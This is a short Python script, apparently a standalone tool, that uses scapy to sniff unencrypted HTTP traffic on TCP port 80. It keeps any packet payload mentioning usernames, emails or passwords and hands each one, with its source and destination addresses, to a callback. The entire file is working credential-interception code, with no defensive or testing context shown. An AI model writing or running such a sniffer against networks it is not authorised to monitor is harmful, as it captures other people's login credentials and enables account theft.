from scapy.all import sniff, TCP, Raw
import re

def extract_login_info(payload):
    payload = payload.decode(errors='ignore').lower()
    if any(keyword in payload for keyword in ["username", "user", "email", "password", "passwd", "pwd"]):
        return payload
    return None

def live_capture(callback, duration=60):
    def process_packet(packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            raw_data = packet[Raw].load
            info = extract_login_info(raw_data)
            if info:
                callback({
                    "src": packet[0][1].src,
                    "dst": packet[0][1].dst,
                    "payload": info
                })

    sniff(filter="tcp port 80", prn=process_packet, timeout=duration)
